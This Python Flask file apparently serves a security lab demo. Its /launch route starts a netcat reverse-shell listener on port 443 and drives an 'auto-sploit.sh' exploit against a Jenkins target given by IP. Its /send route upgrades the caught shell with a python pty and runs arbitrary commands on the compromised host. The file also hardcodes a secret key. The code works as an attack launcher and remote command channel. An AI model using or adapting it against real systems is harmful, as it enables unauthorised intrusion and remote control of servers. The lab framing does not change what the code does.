import pexpect
from flask import Flask
from flask import render_template, request, jsonify, make_response
import os
import time
import logging
app = Flask(__name__)

logging.basicConfig(filename='app.log', level=logging.DEBUG)
logger = logging.getLogger()


app.config['SECRET_KEY'] = 'c27e5a04065046f45a88300d80baa8cd'


@app.route("/", methods=['GET'])
def home():
    if request.method == 'GET':
        return render_template('routing/index.html')


@app.route("/labinfra", methods=['GET'])
def labinfra():
    if request.method == 'GET':
        return render_template('routing/labinfra.html')


@app.route("/awssec", methods=['GET'])
def awssec_info():
    if request.method == 'GET':
        return render_template('routing/awssec.html')


@app.route("/vulnerability", methods=['GET'])
def vulnerability_info():
    if request.method == 'GET':
        return render_template('routing/vulnerability.html')


@app.route("/launch", methods=['GET', 'POST'])
def launch_sploit():
    """
    Accepts a JSON payload with the following structure:
    {
        "target": "nlb-something.fqdn.com",
        "attacker": "1.2.3.4"
    }
    If the payload parses correctly, then launch a reverse shell listener using pexpect.spawn
    then spawn the auto-sploit.sh tool and enter the target and attacker info again using pexpect
    :return: Simple String response for now
    """

    if request.method == 'GET':
        return render_template('routing/launchattack.html')

    if request.method == 'POST':
        language = request.form.get('attackerIp')

        if request.is_json:
            logger.info(request.data)
            payload = request.get_json()
            print(payload)
            print(type(payload))
            target_ip = payload.get('target', '')
            attacker_ip = payload.get('attacker', '')
        else:
            target_ip = request.form.get('target')
            attacker_ip = request.form.get('attacker')
        # res = make_response(jsonify(
        #     {
        #         "attacker":attacker_ip,
        #         "target": target_ip
        #     }), 200)
        # return res

        if target_ip == "" or attacker_ip == "":
            logger.info('Incorrect Json format!')
            print(request.payload)
            res = make_response(jsonify(
                {
                    "result": "error",
                    "message": "ERROR - Incorrect Json format"
                }), 200)
            return res

        exe = '/root/auto-sploit.sh'
        if not os.path.exists(exe):
            return make_response(jsonify({"message": "Cant find auto-sploit.sh"}), 200)
        logger.info('Launching auto-sploit.sh')
        child = pexpect.spawn(exe)
        child.delaybeforesend = 2
        found_index = child.expect(['press any key to continue', pexpect.EOF, pexpect.TIMEOUT])
        if found_index == 0:
            logger.info('launching listener process')
            _launch_listener()
            child.send('\n')
        else:
            res = make_response(jsonify(
                {
                    "result": "error",
                    "message": "ERROR - Could not press key to continue"
                }), 200)
            res.headers['Content-type'] = 'application/json'
            return res
            # return 'ERROR - Could not press key to continue'
        found_index = child.expect(['Enter Attacker IP Address', pexpect.EOF, pexpect.TIMEOUT])
        if found_index == 0:
            logger.info('Sending attacker ip :::' + attacker_ip + ':::')
            child.sendline(attacker_ip)
        else:
            res = make_response(jsonify(
                {
                    "result": "error",
                    "message":"ERROR - Could not enter attacker IP"
                }), 200)
            res.headers['Content-type'] = 'application/json'
            return res
            # return 'ERROR - Could not enter attacker IP'
        found_index = child.expect(['Enter Jenkins Target IP Address', pexpect.EOF, pexpect.TIMEOUT])
        if found_index == 0:
            logger.info(child.before)
            logger.info('Sending target ip')
            child.sendline(target_ip)
        else:
            logger.info(child.before)
            res = make_response(jsonify(
                {
                    "result": "error",
                    "message":"ERROR - Could not enter jenkins IP"
                }), 200)
            res.headers['Content-type'] = 'application/json'
            return res
            # return 'ERROR - Could not enter jenkins IP'
        found_index = child.expect(['pwn', pexpect.EOF, pexpect.TIMEOUT])
        if found_index == 0:
            logger.info('PWN')
            logger.info(child)
            time.sleep(2)
            res = make_response(jsonify(
                {
                    "result": "success",
                    "message":"SUCCESS - auto-sploit launched!"
                }), 200)
            res.headers['Content-type'] = 'application/json'
            return res
            # return 'SUCCESS - auto-sploit launched!'


@app.route("/send", methods=['POST'])
def send_cmd():

    if request.method == 'POST':
        if request.is_json:
            data = request.get_json()
            logger.info('Got request data {}'.format(data))

            cli = data.get('cli', '')
            if cli == '':
                res = make_response(jsonify(
                    {
                        "result": "error",
                        "message":"No command in payload"
                    }), 200)
                res.headers['Content-type'] = 'application/json'
                return res

        if 'listener' in app.config:
            logger.info('We have a listener already up!')
            listener = app.config.get('listener', '')
            if not hasattr(listener, 'isalive') or not listener.isalive():
                res = make_response(jsonify(
                    {
                        "result": "error",
                        "message": "No Listener active"
                    }), 200)
                res.headers['Content-type'] = 'application/json'
                return res

            logger.info('Sending initial command to see where we are!')
            listener.sendline('echo $SHLVL\n')
            found_index = listener.expect(['1', 'jenkins@', 'root@', pexpect.EOF, pexpect.TIMEOUT])
            logger.info('Found index after sending echo is now: ' + str(found_index))
            if found_index == 0:
                # no prompt yet
                logger.info('We have a connection sending python -c import pty......')
                listener.sendline("python -c 'import pty; pty.spawn(\"/bin/bash\")'")
            elif found_index > 2:
                logger.info('Could not understand the response to echo got EOF {}'.format(listener.before))
                res = make_response(jsonify(
                    {
                        "result": "error",
                        "message": "Listener connection error"
                    }), 200)
                res.headers['Content-type'] = 'application/json'
                return res
            found_index = listener.expect(['jenkins@.*$', 'root@.*#', pexpect.EOF, pexpect.TIMEOUT])
            logger.info('Found index is now: ' + str(found_index))
            if found_index > 1:
                logger.info(listener)
                res = make_response(jsonify(
                    {
                        "result": "error",
                        "message": "Listener connection error"
                    }), 200)
                res.headers['Content-type'] = 'application/json'
                return res
            listener.sendline(cli)
            found_index = listener.expect(['jenkins@.*$', 'root@.*#', pexpect.EOF, pexpect.TIMEOUT])
            logger.info('Found index after cli is now: ' + str(found_index))
            if found_index > 1:
                print(listener)
                res = make_response(jsonify(
                    {
                        "result": "error",
                        "message": "sent cli cmd but didnt get the expected response"
                    }), 200)
                res.headers['Content-type'] = 'application/json'
                return res
            else:
                logger.info('response looks good')
                res = make_response(listener.before)
                res.headers['Content-type'] = 'text/plain'
                return res

        else:
            res = make_response(jsonify(
                {
                    "result": "error",
                    "message": "No Listener in app.config"
                }), 200)
            res.headers['Content-type'] = 'application/json'
            return res

    else:
        res = make_response(jsonify(
            {
                "result": "error",
                "message": "Invalid method"
            }), 200)
        res.headers['Content-type'] = 'application/json'
        return res


def _launch_listener():
    if 'listener' not in app.config:
        listener = pexpect.spawn('nc -lvp 443')
        fout = open("LOG.TXT", "wb")
        listener.logfile_read = fout
        found_index = listener.expect(['listening', pexpect.EOF, pexpect.TIMEOUT])
        if found_index != 0:
            return False
        app.config['listener'] = listener
        print('Launched and ready to rock')
        return True
    else:
        listener = app.config['listener']
        if hasattr(listener, 'isalive') and listener.isalive():
            return True
        else:
            listener = pexpect.spawn('nc -lvp 443')
            found_index = listener.expect(['listening', pexpect.EOF, pexpect.TIMEOUT])
            if found_index != 0:
                return False
            app.config['listener'] = listener
            return True
